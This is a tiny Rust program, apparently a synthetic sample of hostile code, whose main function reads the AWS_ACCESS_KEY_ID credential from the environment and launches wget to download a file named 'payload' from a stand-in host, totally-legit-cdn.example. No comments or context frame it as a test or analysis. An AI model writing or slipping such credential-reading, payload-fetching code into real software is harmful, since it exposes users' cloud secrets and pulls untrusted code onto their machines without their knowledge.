use std::env;
use std::process::Command;
fn main() {
    let _v = env::var("AWS_ACCESS_KEY_ID").unwrap_or_default();
    Command::new("wget").arg("http://totally-legit-cdn.example/payload").spawn().ok();
}
